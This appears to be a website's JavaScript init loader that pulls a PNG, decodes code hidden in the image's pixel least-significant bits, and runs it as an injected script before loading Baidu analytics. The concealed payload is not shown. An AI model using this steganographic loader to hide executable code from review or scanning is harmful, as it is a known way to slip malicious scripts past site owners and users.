// ============================================================
// init-loader：从 hidden.png 提取 init.js 并执行
// ============================================================
(async function () {
    // hidden.png 的版本号：用 Date.now()，每次刷新都拉最新
    const PNG_VERSION = Date.now();

    const img = new Image();
    img.crossOrigin = 'anonymous';
    img.src = '/js/hidden.png?v=' + PNG_VERSION;  // ← 加版本号

    await new Promise((resolve, reject) => {
        img.onload = resolve;
        img.onerror = reject;
    });

    const canvas = document.createElement('canvas');
    canvas.width = img.width;
    canvas.height = img.height;
    const ctx = canvas.getContext('2d', { willReadFrequently: true });
    ctx.drawImage(img, 0, 0);
    const data = ctx.getImageData(0, 0, img.width, img.height).data;

    function readBytes(start, count) {
        const out = new Uint8Array(count);
        for (let i = 0; i < count * 8; i++) {
            const idx = start + i;
            // 只读 R、G、B，跳过 A
            const pixelIndex = Math.floor(idx / 3) * 4 + (idx % 3);
            const bit = data[pixelIndex] & 1;
            out[i >> 3] |= bit << (7 - (i & 7));
        }
        return out;
    }

    const header = readBytes(0, 4);
    const len = (header[0] << 24) | (header[1] << 16) | (header[2] << 8) | header[3];
    console.log('[init-loader] 读出长度:', len);

    const body = readBytes(32, len);
    const code = new TextDecoder('utf-8').decode(body);

    console.log('[init-loader] 前 100 字符:', code.slice(0, 100));

    const script = document.createElement('script');
    script.textContent = code;
    document.body.appendChild(script);
    script.remove();

    console.log('[init-loader] 已从图片提取并执行 init.js，长度', len);

    // ============================================================
    // 百度统计：延迟到 load 之后再加载，避免拖累首屏
    // ============================================================
    if (document.readyState === 'complete') {
        loadBaiduTongji();
    } else {
        window.addEventListener('load', loadBaiduTongji);
    }

    function loadBaiduTongji() {
        var s = document.createElement('script');
        s.src = 'https://hm.baidu.com/hm.js?726197c7cdeb238883e13623049915fa';
        s.async = true;
        document.head.appendChild(s);
    }
})();